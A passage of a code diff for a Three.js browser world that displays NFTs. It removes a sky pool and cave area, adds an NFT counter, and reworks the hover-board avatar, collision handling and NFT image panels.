@@ -233,6 +233,19 @@
     max-width: 200px;
   }
   
+  #nft-counter {
+    position: absolute;
+    top: 120px;
+    left: 10px;
+    background: rgba(0,0,0,0.7);
+    color: white;
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-size: 0.8rem;
+    z-index: 100;
+    max-width: 200px;
+  }
+  
   #avatar-selection {
     position: fixed;
     top: 0;
@@ -344,6 +357,10 @@
       font-size: 0.7rem;
       max-width: 150px;
     }
+    #nft-counter {
+      top: 110px;
+      font-size: 0.7rem;
+    }
   }
 </style>
 </head>
@@ -362,12 +379,16 @@
 <div id="canvas-container"></div>
 
 <div id="instructions">
-  <div id="desktop-instructions">Click to lock pointer and navigate with WASD keys. Move mouse to look around. Press SPACE to jump. Find NFTs in the central column from ground to sky!</div>
-  <div id="mobile-instructions" style="display:none;">Use controls to move and look around. Find NFTs in the central column from ground to sky!</div>
+  <div id="desktop-instructions">Click to lock pointer and navigate with WASD keys. Move mouse to look around. Press SPACE to jump. Explore NFTs in the vertical column and bridge!</div>
+  <div id="mobile-instructions" style="display:none;">Use controls to move and look around. Explore NFTs in the vertical column and bridge!</div>
 </div>
 
 <div id="location-info">
   Location: Starting Area
+</div>
+
+<div id="nft-counter">
+  NFTs Loaded: <span id="nft-count">0</span>
 </div>
 
 <div id="mobile-controls">
@@ -584,19 +605,13 @@ let hoverTime = 0;
 let collisionObjects = [];
 let roofObjects = [];
 let playerCollider = new THREE.Box3();
-let playerSize = new THREE.Vector3(8, 1, 8); // Same size as NFT displays
+let playerSize = new THREE.Vector3(10, 2, 10); // Same size as NFT displays
 let playerOnRoof = false;
 let currentRoof = null;
 
-// Swimming pool variables
-let poolGroup;
-let underwaterCaveGroup;
-let isInWater = false;
-let isInUnderwaterCave = false;
-
-// Bridge variables
-let bridgeSegments = [];
+// NFT platform variables
 let nftPlatforms = [];
+let bridgeSegments = [];
 
 function init3DScene() {
   // Create scene
@@ -769,180 +784,11 @@ function createWorld() {
   // Create city with buildings
   createCity();
   
-  // Create spiral bridge to the sky pool
+  // Create spiral bridge
   createMoonBridge();
-  
-  // Create swimming pool at the top of the bridge
-  createSkyPool();
   
   // Add boundary walls to prevent going off map
   createBoundaryWalls();
-}
-
-function createSkyPool() {
-  poolGroup = new THREE.Group();
-  
-  // Pool dimensions
-  const poolWidth = 80;
-  const poolLength = 80;
-  const poolDepth = 15;
-  
-  // Create pool basin - FIXED: Remove collision from pool basin
-  const poolBasinGeometry = new THREE.BoxGeometry(poolWidth, poolDepth, poolLength);
-  const poolBasinMaterial = new THREE.MeshLambertMaterial({ 
-    color: 0x1E40AF,
-    transparent: true,
-    opacity: 0.7
-  });
-  
-  const poolBasin = new THREE.Mesh(poolBasinGeometry, poolBasinMaterial);
-  poolBasin.position.set(0, -poolDepth/2, 0);
-  poolBasin.receiveShadow = true;
-  // NO COLLISION - players can enter freely
-  poolGroup.add(poolBasin);
-  
-  // Create pool walls - these should have collision
-  const wallMaterial = new THREE.MeshLambertMaterial({ color: 0x374151 });
-  
-  // North wall
-  const northWall = new THREE.Mesh(new THREE.BoxGeometry(poolWidth, poolDepth, 2), wallMaterial);
-  northWall.position.set(0, -poolDepth/2, -poolLength/2);
-  poolGroup.add(northWall);
-  
-  // South wall
-  const southWall = new THREE.Mesh(new THREE.BoxGeometry(poolWidth, poolDepth, 2), wallMaterial);
-  southWall.position.set(0, -poolDepth/2, poolLength/2);
-  poolGroup.add(southWall);
-  
-  // East wall
-  const eastWall = new THREE.Mesh(new THREE.BoxGeometry(2, poolDepth, poolLength), wallMaterial);
-  eastWall.position.set(poolWidth/2, -poolDepth/2, 0);
-  poolGroup.add(eastWall);
-  
-  // West wall
-  const westWall = new THREE.Mesh(new THREE.BoxGeometry(2, poolDepth, poolLength), wallMaterial);
-  westWall.position.set(-poolWidth/2, -poolDepth/2, 0);
-  poolGroup.add(westWall);
-  
-  // Create pool ramps for easy entry/exit
-  createPoolRamps(poolWidth, poolLength, poolDepth);
-  
-  // Create overground cave at the edge of the sky pool
-  createOvergroundCave(poolWidth, poolLength, poolDepth);
-  
-  // Position pool at the top of the bridge (around y=750)
-  poolGroup.position.set(0, 750, 0);
-  scene.add(poolGroup);
-  
-  // Add ONLY WALLS to collision objects (not the basin)
-  const northWallBox = new THREE.Box3().setFromObject(northWall);
-  const southWallBox = new THREE.Box3().setFromObject(southWall);
-  const eastWallBox = new THREE.Box3().setFromObject(eastWall);
-  const westWallBox = new THREE.Box3().setFromObject(westWall);
-  
-  collisionObjects.push(northWallBox);
-  collisionObjects.push(southWallBox);
-  collisionObjects.push(eastWallBox);
-  collisionObjects.push(westWallBox);
-}
-
-function createPoolRamps(poolWidth, poolLength, poolDepth) {
-  // Create entry ramp (sloping down into pool)
-  const entryRampWidth = 20;
-  const entryRampLength = poolLength / 2;
-  const entryRampHeight = poolDepth / 2;
-  
-  const entryRampGeometry = new THREE.BoxGeometry(entryRampWidth, 1, entryRampLength);
-  const rampMaterial = new THREE.MeshLambertMaterial({ color: 0x6B7280 });
-  
-  const entryRamp = new THREE.Mesh(entryRampGeometry, rampMaterial);
-  entryRamp.position.set(0, -entryRampHeight/2, -poolLength/4);
-  entryRamp.rotation.x = -Math.atan2(entryRampHeight, entryRampLength);
-  entryRamp.castShadow = true;
-  entryRamp.receiveShadow = true;
-  poolGroup.add(entryRamp);
-  
-  // Create exit ramp (sloping up from bottom of pool)
-  const exitRampWidth = 20;
-  const exitRampLength = poolLength / 2;
-  const exitRampGeometry = new THREE.BoxGeometry(exitRampWidth, 1, exitRampLength);
-  const exitRamp = new THREE.Mesh(exitRampGeometry, rampMaterial);
-  exitRamp.position.set(0, -poolDepth + 0.5, poolLength/4);
-  exitRamp.rotation.x = Math.atan2(poolDepth/2, exitRampLength);
-  exitRamp.castShadow = true;
-  exitRamp.receiveShadow = true;
-  poolGroup.add(exitRamp);
-  
-  // Add ramps to collision objects
-  const entryRampBox = new THREE.Box3().setFromObject(entryRamp);
-  const exitRampBox = new THREE.Box3().setFromObject(exitRamp);
-  collisionObjects.push(entryRampBox);
-  collisionObjects.push(exitRampBox);
-}
-
-function createOvergroundCave(poolWidth, poolLength, poolDepth) {
-  underwaterCaveGroup = new THREE.Group();
-  
-  // Create cave entrance at the edge of the sky pool
-  const caveEntranceGeometry = new THREE.CylinderGeometry(15, 15, 5, 16);
-  const caveEntranceMaterial = new THREE.MeshLambertMaterial({ 
-    color: 0x1F2937,
-    transparent: true,
-    opacity: 0.8
-  });
-  
-  const caveEntrance = new THREE.Mesh(caveEntranceGeometry, caveEntranceMaterial);
-  caveEntrance.position.set(poolWidth/2 + 20, 0, 0);
-  caveEntrance.rotation.x = Math.PI / 2;
-  underwaterCaveGroup.add(caveEntrance);
-  
-  // Create the overground cave (floating in sky)
-  const caveGeometry = new THREE.SphereGeometry(60, 32, 32);
-  const caveMaterial = new THREE.MeshLambertMaterial({ 
-    color: 0x1E40AF,
-    transparent: true,
-    opacity: 0.3,
-    wireframe: false
-  });
-  
-  const cave = new THREE.Mesh(caveGeometry, caveMaterial);
-  cave.position.set(poolWidth/2 + 100, 0, 0);
-  underwaterCaveGroup.add(cave);
-  
-  // Add glowing crystals
-  for (let i = 0; i < 20; i++) {
-    const crystalGeometry = new THREE.ConeGeometry(2, 8, 4);
-    const crystalMaterial = new THREE.MeshLambertMaterial({ 
-      color: 0x60A5FA,
-      emissive: 0x1D4ED8,
-      emissiveIntensity: 0.5
-    });
-    
-    const crystal = new THREE.Mesh(crystalGeometry, crystalMaterial);
-    
-    const phi = Math.acos(2 * Math.random() - 1);
-    const theta = Math.random() * Math.PI * 2;
-    const radius = 58;
-    
-    crystal.position.set(
-      poolWidth/2 + 100 + radius * Math.sin(phi) * Math.cos(theta),
-      radius * Math.sin(phi) * Math.sin(theta),
-      radius * Math.cos(phi)
-    );
-    
-    crystal.lookAt(poolWidth/2 + 100, 0, 0);
-    underwaterCaveGroup.add(crystal);
-  }
-  
-  underwaterCaveGroup.position.set(0, 750, 0);
-  scene.add(underwaterCaveGroup);
-  
-  // Add cave to collision objects
-  const caveBox = new THREE.Box3().setFromCenterAndSize(
-    new THREE.Vector3(poolWidth/2 + 100, 750, 0),
-    new THREE.Vector3(120, 120, 120)
-  );
-  collisionObjects.push(caveBox);
 }
 
 function createMoonBridge() {
@@ -1079,6 +925,7 @@ function createBoundaryWalls() {
     opacity: 0.7
   });
   
+  // Create walls around the perimeter
   const wallGeometry = new THREE.PlaneGeometry(worldSize, wallHeight);
   
   // North wall
@@ -1112,14 +959,16 @@ function createCity() {
   const cityGroup = new THREE.Group();
   const buildingColors = [0x3B82F6, 0xEF4444, 0x10B981, 0xF59E0B, 0x8B5CF6];
   
+  // Create buildings with WIDER dimensions
   const gridSize = 5;
-  const spacing = 120;
+  const spacing = 120; // Increased spacing for wider buildings
   
   for (let x = 0; x < gridSize; x++) {
     for (let z = 0; z < gridSize; z++) {
-      const width = 40 + Math.random() * 30;
-      const depth = 40 + Math.random() * 30;
-      const height = 20 + Math.random() * 40;
+      // Make buildings WIDER but not as tall
+      const width = 40 + Math.random() * 30;  // Increased from 20-35 to 40-70
+      const depth = 40 + Math.random() * 30;  // Increased from 20-35 to 40-70
+      const height = 20 + Math.random() * 40; // Reduced height for better proportions
       
       const buildingGeometry = new THREE.BoxGeometry(width, height, depth);
       const buildingMaterial = new THREE.MeshLambertMaterial({ 
@@ -1128,6 +977,7 @@ function createCity() {
       
       const building = new THREE.Mesh(buildingGeometry, buildingMaterial);
       
+      // Position buildings with more spacing
       building.position.set(
         (x - gridSize/2) * spacing,
         height / 2,
@@ -1139,9 +989,11 @@ function createCity() {
       cityGroup.add(building);
       buildingObjects.push(building);
       
+      // Add building to collision objects
       const buildingBox = new THREE.Box3().setFromObject(building);
       collisionObjects.push(buildingBox);
       
+      // Create a solid roof plane for walking on top of the building
       createBuildingRoof(building.position.x, building.position.y + height/2, building.position.z, width, depth);
     }
   }
@@ -1150,6 +1002,7 @@ function createCity() {
 }
 
 function createBuildingRoof(x, y, z, width, depth) {
+  // Create a solid roof plane for collision
   const roofGeometry = new THREE.PlaneGeometry(width, depth);
   const roofMaterial = new THREE.MeshLambertMaterial({ 
     color: 0x1F2937,
@@ -1159,10 +1012,14 @@ function createBuildingRoof(x, y, z, width, depth) {
   const roof = new THREE.Mesh(roofGeometry, roofMaterial);
   roof.position.set(x, y + 0.1, z);
   roof.rotation.x = Math.PI / 2;
+  
+  // Make the roof solid and visible
   roof.receiveShadow = true;
   roof.castShadow = true;
+  
   scene.add(roof);
   
+  // Add roof to collision objects for walking on
   const roofBox = new THREE.Box3().setFromCenterAndSize(
     new THREE.Vector3(x, y + 0.1, z),
     new THREE.Vector3(width, 0.2, depth)
@@ -1173,50 +1030,47 @@ function createBuildingRoof(x, y, z, width, depth) {
     width: width,
     depth: depth
   });
+  
+  // Also add the roof to the main collision objects to prevent falling through
   collisionObjects.push(roofBox);
 }
 
 function createPlayerAvatar() {
+  // Create a group for the entire player (avatar + hover board)
   const group = new THREE.Group();
   
-  const boardWidth = 8;
-  const boardHeight = 0.3;
-  const boardDepth = 8;
-  
-  const boardGeometry = new THREE.BoxGeometry(boardWidth, boardHeight, boardDepth);
+  // Create a FLAT rectangular board (same dimensions as NFTs) - LAYING DOWN FLAT
+  const boardGeometry = new THREE.PlaneGeometry(10, 10); // Same size as NFT displays
   const boardMaterial = new THREE.MeshStandardMaterial({ 
-    color: 0xC0C0C0,
-    metalness: 0.9,
-    roughness: 0.1,
-    emissive: 0x222222
+    color: 0xC0C0C0, // Silver color
+    metalness: 0.8,
+    roughness: 0.2,
+    side: THREE.DoubleSide
   });
   hoverBoard = new THREE.Mesh(boardGeometry, boardMaterial);
+  // Lay the board flat (rotate to be horizontal)
+  hoverBoard.rotation.x = -Math.PI / 2; // Rotate to lay flat on ground
   hoverBoard.castShadow = true;
   hoverBoard.receiveShadow = true;
   group.add(hoverBoard);
   
-  const underglowGeometry = new THREE.BoxGeometry(boardWidth + 0.5, 0.1, boardDepth + 0.5);
+  // Add green underglow to the hover board
+  const underglowGeometry = new THREE.PlaneGeometry(10.5, 10.5);
   const underglowMaterial = new THREE.MeshBasicMaterial({ 
-    color: 0x00FF00,
+    color: 0x00FF00, // Bright green
     transparent: true,
-    opacity: 0.8
+    opacity: 0.7,
+    side: THREE.DoubleSide
   });
   const underglow = new THREE.Mesh(underglowGeometry, underglowMaterial);
-  underglow.position.y = -boardHeight/2 - 0.05;
+  underglow.rotation.x = -Math.PI / 2; // Lay flat like the board
+  underglow.position.y = -0.1; // Position slightly below the board
   group.add(underglow);
   
-  const frameGeometry = new THREE.BoxGeometry(boardWidth + 0.1, 0.05, boardDepth + 0.1);
-  const frameMaterial = new THREE.MeshStandardMaterial({ 
-    color: 0x888888,
-    metalness: 1.0,
-    roughness: 0.1
-  });
-  const topFrame = new THREE.Mesh(frameGeometry, frameMaterial);
-  topFrame.position.y = boardHeight/2 + 0.025;
-  group.add(topFrame);
-  
+  // Create the avatar standing on the board
   let avatar;
   if (selectedAvatar === 'boy') {
+    // Create boy avatar - blue color scheme
     const bodyGeometry = new THREE.CylinderGeometry(0.5, 0.5, 1.5, 8);
     const bodyMaterial = new THREE.MeshLambertMaterial({ color: 0x3B82F6 });
     const body = new THREE.Mesh(bodyGeometry, bodyMaterial);
@@ -1232,6 +1086,7 @@ function createPlayerAvatar() {
     avatar.add(head);
     
   } else if (selectedAvatar === 'girl') {
+    // Create girl avatar - pink color scheme
     const bodyGeometry = new THREE.CylinderGeometry(0.5, 0.5, 1.5, 8);
     const bodyMaterial = new THREE.MeshLambertMaterial({ color: 0xEC4899 });
     const body = new THREE.Mesh(bodyGeometry, bodyMaterial);
@@ -1247,12 +1102,14 @@ function createPlayerAvatar() {
     avatar.add(head);
   }
   
+  // Position avatar on top of the hover board
   if (avatar) {
-    avatar.position.y = boardHeight/2 + 0.1;
+    avatar.position.y = 0.1; // On top of the board
     avatar.castShadow = true;
     group.add(avatar);
   }
   
+  // Position the entire group at the starting point
   group.position.set(0, hoverHeight, 0);
   group.castShadow = true;
   scene.add(group);
@@ -1278,55 +1135,45 @@ function initMiniMap() {
   miniMapRenderer.setSize(120, 120);
   miniMapRenderer.setClearColor(0x000000, 0.5);
   
+  // Add ground to mini-map
   const groundGeometry = new THREE.PlaneGeometry(worldSize, worldSize);
   const groundMaterial = new THREE.MeshBasicMaterial({ color: 0x4ADE80 });
   const ground = new THREE.Mesh(groundGeometry, groundMaterial);
   ground.rotation.x = -Math.PI / 2;
   miniMapScene.add(ground);
   
-  const poolGeometry = new THREE.PlaneGeometry(80, 80);
-  const poolMaterial = new THREE.MeshBasicMaterial({ color: 0x1E40AF });
-  const poolIndicator = new THREE.Mesh(poolGeometry, poolMaterial);
-  poolIndicator.position.set(0, 0, 0);
-  poolIndicator.rotation.x = -Math.PI / 2;
-  miniMapScene.add(poolIndicator);
-  
-  const bridgeIndicatorGeometry = new THREE.RingGeometry(50, 350, 36);
-  const bridgeIndicatorMaterial = new THREE.MeshBasicMaterial({ 
-    color: 0x00FFFF,
-    side: THREE.DoubleSide,
-    transparent: true,
-    opacity: 0.3
-  });
-  const bridgeIndicator = new THREE.Mesh(bridgeIndicatorGeometry, bridgeIndicatorMaterial);
-  bridgeIndicator.rotation.x = -Math.PI / 2;
-  miniMapScene.add(bridgeIndicator);
-  
+  // Add player indicator
   const playerGeometry = new THREE.CircleGeometry(10, 8);
   const playerMaterial = new THREE.MeshBasicMaterial({ color: 0xFF0000 });
   const playerIndicator = new THREE.Mesh(playerGeometry, playerMaterial);
   playerIndicator.rotation.x = -Math.PI / 2;
   miniMapScene.add(playerIndicator);
   
+  // Add NFT indicators
   const nftIndicatorGeometry = new THREE.CircleGeometry(8, 6);
   const nftIndicatorMaterial = new THREE.MeshBasicMaterial({ color: 0x3B82F6 });
   
   window.updateMiniMap = function() {
+    // Update player position
     playerIndicator.position.x = playerAvatar.position.x;
     playerIndicator.position.z = playerAvatar.position.z;
     
+    // Update player avatar rotation based on camera angle
     if (playerAvatar) {
       playerAvatar.rotation.y = cameraAngle + Math.PI;
     }
     
+    // Update location info
     updateLocationInfo();
     
+    // Clear previous NFT indicators
     miniMapScene.children.forEach((child, index) => {
       if (child.userData && child.userData.isNFTIndicator) {
         miniMapScene.children.splice(index, 1);
       }
     });
     
+    // Add current NFT indicators
     nftObjects.forEach(nft => {
       const indicator = new THREE.Mesh(nftIndicatorGeometry, nftIndicatorMaterial);
       indicator.position.x = nft.position.x;
@@ -1346,24 +1193,21 @@ function updateLocationInfo() {
   const z = playerAvatar.position.z;
   const y = playerAvatar.position.y;
   
-  if (isInUnderwaterCave) {
-    locationInfo.textContent = "Location: Overground Cave (Zero Gravity)";
-  }
-  else if (isInWater) {
-    locationInfo.textContent = "Location: Sky Pool (Zero Gravity)";
-  }
-  else if (y > 700) {
-    locationInfo.textContent = "Location: Sky Platform (Floating)";
-  }
-  else if (y > 50) {
+  // Check if player is on bridge
+  const isOnBridge = checkIfOnBridge(playerAvatar.position);
+  
+  if (isOnBridge) {
     locationInfo.textContent = "Location: Spiral Bridge (Floating)";
   }
-  else if (playerOnRoof) {
-    locationInfo.textContent = "Location: Building Roof (Floating)";
-  }
+  // Check if player is in the city
   else if (x > -200 && x < 200 && z > -200 && z < 200) {
     locationInfo.textContent = "Location: City Center (Floating)";
   }
+  // Check if player is in the NFT column
+  else if (y > 100) {
+    locationInfo.textContent = "Location: NFT Column (Floating)";
+  }
+  // Otherwise in the grass fields
   else {
     locationInfo.textContent = "Location: Grass Fields (Floating)";
   }
@@ -1375,28 +1219,7 @@ function onWindowResize() {
   renderer.setSize(window.innerWidth, window.innerHeight);
 }
 
-function checkCollisions(newPosition) {
-  playerCollider.setFromCenterAndSize(
-    new THREE.Vector3(newPosition.x, newPosition.y, newPosition.z),
-    playerSize
-  );
-  
-  // Check if player is on bridge and allow movement
-  const isOnBridge = checkIfOnBridge(newPosition);
-  
-  if (isOnBridge) {
-    return false; // No collision when on bridge
-  }
-  
-  for (let i = 0; i < collisionObjects.length; i++) {
-    if (playerCollider.intersectsBox(collisionObjects[i])) {
-      return true;
-    }
-  }
-  
-  return false;
-}
-
+// Check if player is on bridge
 function checkIfOnBridge(position) {
   // Check if player is close to any bridge segment
   for (let i = 0; i < bridgeSegments.length; i++) {
@@ -1411,6 +1234,31 @@ function checkIfOnBridge(position) {
   return false;
 }
 
+// COLLISION DETECTION FOR FLOATING BOARD
+function checkCollisions(newPosition) {
+  // Update player collider position and size for floating board
+  playerCollider.setFromCenterAndSize(
+    new THREE.Vector3(newPosition.x, newPosition.y, newPosition.z),
+    playerSize
+  );
+  
+  // Check if player is on bridge and allow movement
+  const isOnBridge = checkIfOnBridge(newPosition);
+  
+  if (isOnBridge) {
+    return false; // No collision when on bridge
+  }
+  
+  // Check for collisions with all collision objects
+  for (let i = 0; i < collisionObjects.length; i++) {
+    if (playerCollider.intersectsBox(collisionObjects[i])) {
+      return true; // Collision detected
+    }
+  }
+  
+  return false; // No collision
+}
+
 function animate() {
   requestAnimationFrame(animate);
   
@@ -1418,12 +1266,17 @@ function animate() {
   const delta = (time - prevTime) / 1000;
   hoverTime += delta;
   
+  // Handle movement
   if ((controls && controls.isLocked) || isMobile) {
     const moveSpeed = 200.0 * delta;
     
+    // Store current position for collision detection
     const currentPosition = playerAvatar.position.clone();
+    
+    // Calculate new position based on movement
     const newPosition = currentPosition.clone();
     
+    // Calculate movement direction based on camera angle
     const forward = new THREE.Vector3(
       Math.sin(cameraAngle),
       0,
@@ -1448,8 +1301,6 @@ function animate() {
       newPosition.add(right.clone().multiplyScalar(moveSpeed));
     }
     
-    const hoverBob = Math.sin(hoverTime * hoverBobSpeed) * hoverBobAmount;
-    
     // Check if player is on bridge
     const isOnBridge = checkIfOnBridge(newPosition);
     
@@ -1464,89 +1315,35 @@ function animate() {
           break;
         }
       }
-      newPosition.y = bridgeHeight + hoverHeight + hoverBob;
+      newPosition.y = bridgeHeight + hoverHeight + (Math.sin(hoverTime * hoverBobSpeed) * hoverBobAmount);
     } else {
       // Not on bridge - normal floating
+      const hoverBob = Math.sin(hoverTime * hoverBobSpeed) * hoverBobAmount;
       newPosition.y = hoverHeight + hoverBob;
     }
     
+    // Apply jump physics if jumping
     if (velocity.y !== 0) {
       velocity.y -= 9.8 * 100.0 * delta;
       newPosition.y += (velocity.y * delta);
       
-      if (newPosition.y <= hoverHeight + hoverBob && velocity.y < 0 && !isOnBridge) {
+      // Reset jump when back to normal hover height
+      if (newPosition.y <= hoverHeight + (Math.sin(hoverTime * hoverBobSpeed) * hoverBobAmount) && velocity.y < 0 && !isOnBridge) {
         velocity.y = 0;
         canJump = true;
       }
     }
     
-    // FIXED: Pool detection - now for sky pool
-    const poolBounds = new THREE.Box3(
-      new THREE.Vector3(-40, 750 - 15, -40),
-      new THREE.Vector3(40, 750, 40)
-    );
-    isInWater = poolBounds.containsPoint(playerAvatar.position);
-    
-    const caveBounds = new THREE.Box3(
-      new THREE.Vector3(80, 750 - 60, -60),
-      new THREE.Vector3(200, 750 + 60, 60)
-    );
-    isInUnderwaterCave = caveBounds.containsPoint(playerAvatar.position);
-    
-    // FIXED: Pool gravity removed - now you float in the sky pool!
-    if (isInWater) {
-      // Remove gravity effects in pool
-      velocity.y = 0;
-      // Allow floating movement with slight resistance
-      const waterMoveSpeed = moveSpeed * 0.7;
-      
-      if (moveForward) {
-        newPosition.add(forward.clone().multiplyScalar(waterMoveSpeed));
-      }
-      if (moveBackward) {
-        newPosition.sub(forward.clone().multiplyScalar(waterMoveSpeed));
-      }
-      if (moveLeft) {
-        newPosition.sub(right.clone().multiplyScalar(waterMoveSpeed));
-      }
-      if (moveRight) {
-        newPosition.add(right.clone().multiplyScalar(waterMoveSpeed));
-      }
-      
-      // Allow vertical movement with space/up button
-      if (canJump) {
-        newPosition.y += 50 * delta;
-      }
-    }
-    
-    if (isInUnderwaterCave) {
-      // Zero gravity in overground cave
-      velocity.y *= 0.98;
-      
-      if (moveForward) {
-        newPosition.add(forward.clone().multiplyScalar(moveSpeed * 0.5));
-      }
-      if (moveBackward) {
-        newPosition.sub(forward.clone().multiplyScalar(moveSpeed * 0.5));
-      }
-      if (moveLeft) {
-        newPosition.sub(right.clone().multiplyScalar(moveSpeed * 0.5));
-      }
-      if (moveRight) {
-        newPosition.add(right.clone().multiplyScalar(moveSpeed * 0.5));
-      }
-      
-      if (canJump && velocity.y === 0) {
-        velocity.y += 200 * delta;
-      }
-    }
-    
+    // Check for collisions before updating position
     if (!checkCollisions(newPosition)) {
+      // No collision, update position
       playerAvatar.position.copy(newPosition);
     } else {
+      // Collision detected, revert to original position
       playerAvatar.position.copy(currentPosition);
     }
     
+    // Prevent going outside world boundaries
     if (playerAvatar.position.x > worldBoundary) {
       playerAvatar.position.x = worldBoundary;
     }
@@ -1561,27 +1358,34 @@ function animate() {
     }
   }
   
+  // Handle look for mobile
   if (isMobile && (lookX !== 0 || lookY !== 0)) {
     targetCameraAngle -= lookX * 0.01;
+    // Limit vertical camera movement for third-person
     cameraHeight = Math.max(5, Math.min(20, cameraHeight - lookY * 0.1));
   }
   
+  // Update third-person camera
   updateThirdPersonCamera();
   
+  // Update raycaster for object interaction
   raycaster.set(camera.position, camera.getWorldDirection(new THREE.Vector3()));
   
   const intersects = raycaster.intersectObjects(nftObjects);
   
   if (intersects.length > 0) {
     if (currentIntersected !== intersects[0].object) {
+      // Reset previous intersection
       if (currentIntersected) {
         currentIntersected.material.emissive.setHex(currentIntersected.userData.originalEmissive);
       }
       
+      // Set new intersection
       currentIntersected = intersects[0].object;
       currentIntersected.userData.originalEmissive = currentIntersected.material.emissive.getHex();
       currentIntersected.material.emissive.setHex(0x3b82f6);
       
+      // Change cursor to pointer
       if (!isMobile) {
         document.body.style.cursor = 'pointer';
       }
@@ -1596,6 +1400,7 @@ function animate() {
     }
   }
   
+  // Update mini-map
   if (window.updateMiniMap) {
     window.updateMiniMap();
   }
@@ -1604,18 +1409,20 @@ function animate() {
   renderer.render(scene, camera);
 }
 
+/* ==============================
+   NFT PLATFORM CREATION
+============================== */
 function createNFTPlatform(x, y, z) {
   // Create a floating platform for the NFT
-  const platformGeometry = new THREE.CylinderGeometry(8, 8, 1, 16);
+  const platformGeometry = new THREE.CylinderGeometry(6, 6, 0.5, 16);
   const platformMaterial = new THREE.MeshLambertMaterial({ 
-    color: 0x3B82F6,
+    color: 0x2a2a5a,
     transparent: true,
     opacity: 0.8
   });
   
   const platform = new THREE.Mesh(platformGeometry, platformMaterial);
-  platform.position.set(x, y, z);
-  platform.castShadow = true;
+  platform.position.set(x, y - 4, z);
   platform.receiveShadow = true;
   scene.add(platform);
   
@@ -1628,267 +1435,267 @@ function createNFTPlatform(x, y, z) {
 }
 
 function createNFTPlane(nftData, position) {
-  const geometry = new THREE.PlaneGeometry(12, 12);
+  // Create a plane for the NFT image (same size as player board)
+  const geometry = new THREE.PlaneGeometry(10, 10);
   const textureLoader = new THREE.TextureLoader();
   
-  const material = new THREE.MeshLambertMaterial({
-    color: 0xffffff,
+  const material = new THREE.MeshStandardMaterial({ 
     side: THREE.DoubleSide,
     transparent: true,
     opacity: 0.9
   });
   
   const plane = new THREE.Mesh(geometry, material);
-  plane.position.copy(position);
-  plane.rotation.y = Math.PI / 4;
-  plane.castShadow = true;
-  plane.receiveShadow = true;
+  plane.position.set(position.x, position.y, position.z);
   
+  // Rotate to face a random direction
+  plane.rotation.y = Math.random() * Math.PI * 2;
+  
+  // Store NFT data for interaction
   plane.userData = {
     nftData: nftData,
     isNFT: true,
     originalEmissive: 0x000000
   };
   
-  textureLoader.load(nftData.image, function(texture) {
+  // Load the NFT image
+  textureLoader.load(nftData.image_url || 'https://via.placeholder.com/400x400?text=NFT+Image', function(texture) {
     material.map = texture;
     material.needsUpdate = true;
+  }, undefined, function(err) {
+    console.error('Error loading NFT image:', err);
   });
   
+  plane.castShadow = true;
+  plane.receiveShadow = true;
   scene.add(plane);
   nftObjects.push(plane);
   
-  return plane;
-}
-
-async function loadNFTs() {
-  try {
-    const { data: nfts, error } = await client
-      .from('nfts')
-      .select('*')
-      .eq('listed', true);
-    
-    if (error) throw error;
-    
-    nftObjects.forEach(nft => scene.remove(nft));
-    nftObjects = [];
-    nftPlatforms.forEach(platform => scene.remove(platform));
-    nftPlatforms = [];
-    
-    if (nfts && nfts.length > 0) {
-      // Create NFTs in a vertical column from ground to sky in the center
-      const centerX = 0;
-      const centerZ = 0;
-      const startHeight = 20; // Ground level + offset
-      const endHeight = 720; // Just below sky pool level
-      const nftSpacing = 35; // Vertical spacing between NFTs
-      
-      // Calculate how many NFTs we can fit in the vertical column
-      const maxNFTs = Math.min(nfts.length, Math.floor((endHeight - startHeight) / nftSpacing));
-      
-      // Create main central column of NFTs
-      for (let i = 0; i < maxNFTs && i < nfts.length; i++) {
-        const height = startHeight + (i * nftSpacing);
-        
-        // Create floating platform for the NFT
-        createNFTPlatform(centerX, height, centerZ);
-        
-        // Position NFT slightly above the platform
-        const nftPosition = new THREE.Vector3(centerX, height + 6, centerZ);
-        createNFTPlane(nfts[i], nftPosition);
-      }
-      
-      // Create additional NFTs in circular patterns around the central column
-      let nftIndex = maxNFTs;
-      const levels = [50, 150, 250, 350, 450, 550, 650]; // Specific heights for circular arrangements
-      
-      for (let level of levels) {
-        if (nftIndex >= nfts.length) break;
-        
-        const radius = 30 + (level / 20); // Radius increases with height
-        const nftsAtThisLevel = 4; // 4 NFTs around each level
-        
-        for (let j = 0; j < nftsAtThisLevel && nftIndex < nfts.length; j++) {
-          const angle = (j / nftsAtThisLevel) * Math.PI * 2;
-          const offsetX = Math.cos(angle) * radius;
-          const offsetZ = Math.sin(angle) * radius;
-          
-          createNFTPlatform(offsetX, level, offsetZ);
-          const sideNFTPosition = new THREE.Vector3(offsetX, level + 6, offsetZ);
-          createNFTPlane(nfts[nftIndex], sideNFTPosition);
-          nftIndex++;
-        }
-      }
-      
-      // Add special premium NFTs at the very top
-      if (nftIndex < nfts.length) {
-        const premiumPositions = [
-          new THREE.Vector3(0, 740, 0),
-          new THREE.Vector3(15, 745, 15),
-          new THREE.Vector3(-15, 745, -15),
-          new THREE.Vector3(20, 750, -20),
-          new THREE.Vector3(-20, 750, 20)
-        ];
-        
-        for (let pos of premiumPositions) {
-          if (nftIndex >= nfts.length) break;
-          createNFTPlatform(pos.x, pos.y - 6, pos.z);
-          createNFTPlane(nfts[nftIndex], pos);
-          nftIndex++;
-        }
-      }
-    }
-  } catch (error) {
-    console.error('Error loading NFTs:', error);
-  }
+  // Add a subtle glow effect
+  const glowGeometry = new THREE.PlaneGeometry(10.5, 10.5);
+  const glowMaterial = new THREE.MeshBasicMaterial({ 
+    color: 0x3b82f6,
+    transparent: true,
+    opacity: 0.4,
+    side: THREE.DoubleSide
+  });
+  const glow = new THREE.Mesh(glowGeometry, glowMaterial);
+  glow.position.copy(plane.position);
+  glow.rotation.copy(plane.rotation);
+  scene.add(glow);
+  
+  // Make glow part of the NFT object for interaction
+  plane.userData.glow = glow;
 }
 
 function openNFTModal(nftData) {
-  document.getElementById('modal-image').src = nftData.image;
-  document.getElementById('modal-title').textContent = nftData.name;
-  document.getElementById('modal-description').textContent = nftData.description;
-  document.getElementById('modal-price').textContent = nftData.price || '0.1';
+  document.getElementById('modal-image').src = nftData.image_url || 'https://via.placeholder.com/400x400?text=NFT+Image';
+  document.getElementById('modal-title').textContent = nftData.name || `${nftData.collection || 'Untitled'} #${nftData.token_id || ''}`;
+  document.getElementById('modal-description').textContent = nftData.description || 'No description available';
+  document.getElementById('modal-price').textContent = nftData.price_eth || 'N/A';
   
   const actions = document.getElementById('modal-actions');
   actions.innerHTML = '';
   
